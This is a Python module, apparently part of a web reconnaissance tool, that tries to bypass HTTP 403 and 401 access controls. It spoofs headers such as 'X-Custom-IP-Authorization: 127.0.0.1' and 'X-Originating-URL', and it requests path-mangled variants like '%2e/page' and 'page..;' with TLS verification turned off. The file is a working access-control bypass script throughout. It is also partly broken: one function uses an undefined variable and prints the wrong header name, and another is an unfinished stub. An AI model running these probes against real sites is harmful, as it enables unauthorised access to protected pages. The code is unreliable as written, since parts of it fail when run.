import requests
import traceback
from config import PLUS, WARNING, INFO, BYP

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def method(res, url):
	""" 
	Try other method 
	Ex: OPTIONS /admin
	#TODO
	"""
	methods = ["POST", "OPTIONS", "PUT", "TRACE", "TRACK", "PATCH"]


def original_url(res, page, url):
	# Ex: http://lpage.com/admin header="X-Originating-URL": admin
	header = {
	"X-Originating-URL": page
	}
	req = requests.get(res, verify=False, headers=header, allow_redirects=False)
	if req.status_code not in [403, 401, 404, 429, 301, 302, 400, 408, 503, 405, 428, 412, 666]:
		print("{}[{}] {} Forbidden Bypass with: 'X-Originating-URL: {}'".format(BYP, req.status_code, url+page, page))


def IP_authorization(res, url):
	# Ex: http://lpage.com/admin header="X-Originating-URL": 127.0.0.1
	header = {
	"X-Custom-IP-Authorization": "127.0.0.1"
	}
	req = requests.get(res, verify=False, headers=header, allow_redirects=False)
	if req.status_code not in [403, 401, 404, 429, 301, 302, 400, 408, 503, 405, 428, 412, 666]:
		print("{}[{}] {} Forbidden Bypass with: 'X-Originating-URL: {}'".format(BYP, req.status_code, url+page, page))


def other_bypass(url, page, req_url):
	payl = [page+"/.", "/"+page+"/", "./"+page+"/./", "%2e/"+page, page+"/.;/", ".;/"+page, page+"..;", page+"/;/"] #http://exemple.com/+page+bypass
	for p in payl:
		url_b = url + p
		#print(url_b)
		req = requests.get(url_b, verify=False, allow_redirects=True)
		#print(req.status_code)
		if req.status_code not in [403, 401, 404, 429, 301, 302, 400, 408, 503, 405, 428, 412, 666] and len(req.content) != len(req_url.content):
			print("{}[{}] Forbidden Bypass with : {}".format(BYP, req.status_code, url_b))



def bypass_forbidden(res):
	"""
	Bypass_forbidden: function for try to bypass code response 403/forbidden
	"""
	res_page = res.split("/")[3:]
	url_split = res.split("/")[:3]
	url = "/".join(url_split) + "/"
	page = "/".join(res_page) if len(res_page) > 1 else "".join(res_page)
	req_res = requests.get(res, verify=False)
	req_url = requests.get(url, verify=False)
	if len(req_res.content) in range(len(req_url.content) - 50, len(req_url.content) + 50):
		pass
	else:
		original_url(res, page, url)
		IP_authorization(res, url)
		#method(res, url) #TODO
		other_bypass(url, page, req_url)


"""if __name__ == '__main__':
	res = ""
	bypass_forbidden(res)"""